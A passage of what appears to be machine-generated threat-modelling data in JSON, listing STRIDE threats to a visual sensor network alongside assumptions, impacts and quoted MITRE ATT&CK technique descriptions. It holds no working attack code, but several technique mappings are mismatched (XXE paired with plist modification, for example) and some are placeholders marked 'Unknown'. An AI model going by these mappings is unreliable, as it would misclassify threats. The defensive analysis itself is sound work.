        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attackers use the Expression Language Injection vulnerability to inject malicious code.",
            "Assumptions": [
                {
                    "Assumption": "The system uses vulnerable versions of the software without adequate input validation.",
                    "Role": "System Designer",
                    "Condition": "Presence of input validation flaws"
                },
                {
                    "Assumption": "Attackers can send specially crafted messages or requests to the application.",
                    "Role": "Attacker",
                    "Condition": "Network accessibility"
                },
                {
                    "Assumption": "No runtime monitoring to detect and prevent abnormal process behaviors.",
                    "Role": "System Admin",
                    "Condition": "Absence of anomaly detection mechanisms"
                }
            ],
            "Potential Impact": "Manipulation of system operations, data corruption, and execution of unauthorized commands.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code injection",
                "vulnerability",
                "application"
            ],
            "mitre_technique": {
                "name": "JavaScript",
                "description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
                "id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
                "technique_id": "T1059.007"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a certain video feed due to lack of non-repudiation mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "No logging or audit trails are implemented to track specific actions.",
                    "Role": "System Designer",
                    "Condition": "Insufficient logging mechanisms"
                },
                {
                    "Assumption": "Users can alter or delete log files without detection.",
                    "Role": "System Admin",
                    "Condition": "Weak access controls on log data"
                },
                {
                    "Assumption": "No digital signatures or timestamping on sent data.",
                    "Role": "System Designer",
                    "Condition": "Lack of cryptographic assurances"
                }
            ],
            "Potential Impact": "Difficulty in verifying actions leading to potential disputes and security incidents.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "non-repudiation",
                "logging",
                "audit trails"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker modifies logs to hide their malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored in a location accessible to the attacker.",
                    "Role": "System Admin",
                    "Condition": "Inadequate log protection"
                },
                {
                    "Assumption": "No integrity checks are performed on log files.",
                    "Role": "System Designer",
                    "Condition": "Lack of cryptographic protection for logs"
                },
                {
                    "Assumption": "Logging mechanisms do not have redundancy or tamper-detection features.",
                    "Role": "System Designer",
                    "Condition": "Single point of failure in logging infrastructure"
                }
            ],
            "Potential Impact": "Obfuscation of attack activities, hindering incident response and forensic investigations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "unauthorized access",
                "obfuscation"
            ],
            "mitre_technique": {
                "name": "Obfuscated Files or Information",
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ",
                "id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
                "technique_id": "T1027"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Malicious user impersonates legitimate user actions, then denies any wrongdoing.",
            "Assumptions": [
                {
                    "Assumption": "Authentication mechanisms do not securely log user activities.",
                    "Role": "System Designer",
                    "Condition": "Weak or no activity logging"
                },
                {
                    "Assumption": "Impersonated actions are indistinguishable from legitimate actions.",
                    "Role": "System Designer",
                    "Condition": "Lack of differentiating features for actions"
                },
                {
                    "Assumption": "System does not implement multi-factor authentication.",
                    "Role": "System Designer",
                    "Condition": "Single-factor authentication in use"
                }
            ],
            "Potential Impact": "Difficulties in proving user actions, potentially leading to unauthorized activities going undetected.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "activity logging",
                "authentication",
                "impersonation"
            ],
            "mitre_technique": {
                "name": "VNC",
                "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)",
                "id": "attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b",
                "technique_id": "T1021.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits XML External Entity (XXE) vulnerability to exfiltrate sensitive files.",
            "Assumptions": [
                {
                    "Assumption": "Application processes XML inputs without proper validation.",
                    "Role": "System Designer",
                    "Condition": "Unsecured XML parsing"
                },
                {
                    "Assumption": "Sensitive files are accessible to the application\u2019s processing environment.",
                    "Role": "System Admin",
                    "Condition": "No finer access control"
                },
                {
                    "Assumption": "Logging and monitoring mechanisms do not detect unusual file access patterns.",
                    "Role": "System Admin",
                    "Condition": "Absence of anomaly detection mechanisms"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, potential data breach.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "xml",
                "file exfiltration",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Plist Modification",
                "description": "Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>/Library/Preferences</code> (which execute with elevated privileges) and <code>~/Library/Preferences</code> (which execute with a user's privileges). \nAdversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan)",
                "id": "attack-pattern--06780952-177c-4247-b978-79c357fb311f",
                "technique_id": "T1150"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive video feeds are accessed by unauthorized users due to misconfiguration.",
            "Assumptions": [
                {
                    "Assumption": "Access control mechanisms are incorrectly configured or too permissive.",
                    "Role": "System Admin",
                    "Condition": "Misconfigured access controls"
                },
                {
                    "Assumption": "Sensitive data is not encrypted during transmission.",
                    "Role": "System Designer",
                    "Condition": "No encryption on data channels"
                },
                {
                    "Assumption": "User activity is not properly logged or monitored.",
                    "Role": "System Admin",
                    "Condition": "Weak monitoring mechanisms"
                }
            ],
            "Potential Impact": "Exposure of sensitive visual data to unauthorized entities.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "access control",
                "video feeds",
                "misconfiguration"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Intruders monitor unencrypted network traffic to collect sensitive visual data.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic between nodes and central server is unencrypted.",
                    "Role": "System Designer",
                    "Condition": "Lack of strong encryption"
                },
                {
                    "Assumption": "Intruders have access to network configurations or network pathways.",
                    "Role": "Attacker",
                    "Condition": "Network accessibility"
                },
                {
                    "Assumption": "No detection mechanisms to identify abnormal network traffic behaviors.",
                    "Role": "System Admin",
                    "Condition": "Detailed traffic monitoring absent"
                }
            ],
            "Potential Impact": "Unauthorized access and leakage of sensitive and confidential visual data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network monitoring",
                "visual data",
                "unencrypted traffic"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the network with excessive data, preventing nodes from communicating.",
            "Assumptions": [
                {
                    "Assumption": "Network lacks adequate throttling or filtering mechanisms.",
                    "Role": "System Network Operator",
                    "Condition": "Lack of anti-flooding protections"
                },
                {
                    "Assumption": "Attacker can generate large volumes of traffic towards the network.",
                    "Role": "Attacker",
                    "Condition": "Sufficient resources to flood"
                },
                {
                    "Assumption": "System does not dynamically adjust to traffic loads.",
                    "Role": "System Designer",
                    "Condition": "Static network capacity"
                }
            ],
            "Potential Impact": "Network congestion, node communication failures, and loss of data transmission.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network flooding",
                "traffic congestion",
                "communication disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits code execution vulnerability to repeatedly crash critical services.",
            "Assumptions": [
                {
                    "Assumption": "System uses software with known code execution vulnerabilities.",
                    "Role": "System Admin",
                    "Condition": "Outdated or unpatched software"
                },
                {
                    "Assumption": "Attacker has knowledge of the specific exploit.",
                    "Role": "Attacker",
                    "Condition": "Access to exploit details"
                },
                {
                    "Assumption": "No redundancy in critical services to failover after crashes.",
                    "Role": "System Designer",
                    "Condition": "Lack of high availability setup"
                }
            ],
            "Potential Impact": "Interruptions of critical services, potential complete service outage.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "code execution",
                "service crash",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious actor uses SSID injection flaw to disrupt Wi-Fi connections of IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has the ability to inject SSID packets.",
                    "Role": "Attacker",
                    "Condition": "Proximity to Wi-Fi network"
                },
                {
                    "Assumption": "IoT devices depend exclusively on Wi-Fi for network connectivity.",
                    "Role": "System Designer",
                    "Condition": "Dependence on Wi-Fi"
                },
                {
                    "Assumption": "No protections are in place to detect and filter malicious SSID packets.",
                    "Role": "System Admin",
                    "Condition": "Lack of SSID filtering mechanisms"
                }
            ],
            "Potential Impact": "Disruption of network access for IoT devices, leading to data loss or service unavailability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "wifi disruption",
                "ssid injection",
                "network connectivity"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits the NVIDIA GPU Display Driver vulnerability to gain elevated system privileges.",
            "Assumptions": [
                {
                    "Assumption": "System runs affected versions of NVIDIA GPU Display Driver.",
                    "Role": "System Admin",
                    "Condition": "Outdated or unpatched driver"
                },
                {
                    "Assumption": "Attacker can execute the crafted shader on the GPU.",
                    "Role": "Attacker",
                    "Condition": "Access to GPU resources"
                },
                {
                    "Assumption": "No runtime monitoring to detect abnormal shader execution.",
                    "Role": "System Admin",
                    "Condition": "Lack of GPU activity monitoring"
                }
            ],
            "Potential Impact": "Gaining root or administrative access, leading to full control of the system.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "gpu vulnerability",
                "root access",
                "code execution"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting the AMDPowerProfiler.sys driver to escalate privileges and execute code in ring-0.",
            "Assumptions": [
                {
                    "Assumption": "System uses the vulnerable version of AMDPowerProfiler.sys driver.",
                    "Role": "System Admin",
                    "Condition": "Outdated or unpatched driver"
                },
                {
                    "Assumption": "Attacker can load and manipulate this driver.",
                    "Role": "Attacker",
                    "Condition": "Access to system with vulnerable driver"
                },
                {
                    "Assumption": "No measures to prevent loading of untrusted drivers.",
                    "Role": "System Admin",
                    "Condition": "System allows loading of untrusted drivers"
                }
            ],
            "Potential Impact": "Full system control and possible execution of arbitrary kernel-level code.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "kernel execution",
                "driver exploitation",
                "ring-0"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker leverages CWE-502 Deserialization of Untrusted Data at the rabbitmq-connector plugin to escalate privileges.",
            "Assumptions": [
                {
                    "Assumption": "Application uses the vulnerable rabbitmq-connector plugin.",
                    "Role": "System Admin",
                    "Condition": "Outdated or unpatched plugin"
                },
                {
                    "Assumption": "Attacker can send crafted messages to the application.",
                    "Role": "Attacker",
                    "Condition": "Network access to messaging endpoint"
                },
                {
                    "Assumption": "No security checks on serialized data.",
                    "Role": "System Designer",
                    "Condition": "Lack of serialization security measures"
                }
            ],
            "Potential Impact": "Attacker gains higher-level access, leading to potential data manipulation and unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "deserialization",
                "rabbitmq",
                "data injection"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "20",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a legitimate camera node to inject false visual data into the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Lack of mutual authentication between camera nodes",
                    "Role": "System Designer",
                    "Condition": "Design does not enforce node authentication"
                },
                {
                    "Assumption": "Attacker has access to network",
                    "Role": "Network Admin",
                    "Condition": "Network security controls are insufficient"
                },
                {
                    "Assumption": "Node identity verification is based on easily forgeable credentials",
                    "Role": "Security Engineer",
                    "Condition": "Use of weak identity management"
                }
            ],
            "Potential Impact": "Data integrity compromised due to false data injection.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "credential access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of an administrator to gain access to VSN configuration.",
            "Assumptions": [
                {
                    "Assumption": "External attacker captures admin credentials",
                    "Role": "Security Officer",
                    "Condition": "Credentials are not encrypted"
                },
                {
                    "Assumption": "Admin roles are not strictly segregated",
                    "Role": "System Architect",
                    "Condition": "Roles lack proper access controls"
                },
                {
                    "Assumption": "Lack of multi-factor authentication (MFA)",
                    "Role": "System Integrator",
                    "Condition": "Single factor authentication in use"
                }
            ],
            "Potential Impact": "Unauthorized disclosure and modification of network configurations.",
            "MITRE ATT&CK Keywords": [
                "credential access",
                "privilege escalation",
                "configuration manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics a trusted software update server to distribute malicious firmware.",
            "Assumptions": [
                {
                    "Assumption": "No verification of firmware source",
                    "Role": "Developer",
                    "Condition": "Source verification is disabled"
                },
                {
                    "Assumption": "Update process does not utilize signed updates",
                    "Role": "System Engineer",
                    "Condition": "Unsigned firmware updates allowed"
                },
                {
                    "Assumption": "Network traffic is not encrypted",
                    "Role": "Network Admin",
                    "Condition": "Lack of network encryption protocols"
                }
            ],
            "Potential Impact": "System integrity and availability compromised due to installation of malicious firmware.",
            "MITRE ATT&CK Keywords": [
                "supply chain compromise",
                "malware",
                "firmware",
                "update mechanism"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a known vulnerability in the Linux kernel to modify the camera node's firmware.",
            "Assumptions": [
                {
                    "Assumption": "System runs a vulnerable version of the Linux kernel",
                    "Role": "System Admin",
                    "Condition": "Kernel not updated"
                },
                {
                    "Assumption": "Firmware has insufficient integrity checks",
                    "Role": "Firmware Developer",
                    "Condition": "Lack of secure boot mechanisms"
                },
                {
                    "Assumption": "Attacker has network access",
                    "Role": "Network Security Engineer",
                    "Condition": "Insufficient network segmentation"
                }
            ],
            "Potential Impact": "Compromise of data integrity and potential unauthorized control over camera nodes.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "kernel",
                "firmware",
                "network access"
            ],
            "mitre_technique": {
                "name": "Rootkit",
